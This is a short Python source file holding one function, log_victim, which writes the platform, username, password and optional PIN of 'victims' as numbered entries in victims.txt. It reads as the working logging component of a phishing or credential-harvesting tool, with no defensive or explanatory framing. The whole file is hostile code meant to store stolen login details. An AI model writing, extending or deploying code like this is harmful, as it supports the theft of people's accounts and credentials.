def log_victim(platform, username, password, pin=None):
    info = (
        f"{platform.upper()} | username='{username}', password='{password}', pin='{pin}'"
        if pin
        else f"{platform.upper()} | username='{username}', password='{password}'"
    )

    # Count existing victims
    try:
        with open("victims.txt", "r") as file:
            count = sum(1 for _ in file)
    except FileNotFoundError:
        count = 0

    number = count + 1

    with open("victims.txt", "a+") as file:
        file.write(f"{number}. {info}\n")

    print(f"Victim logged: {info.strip()}")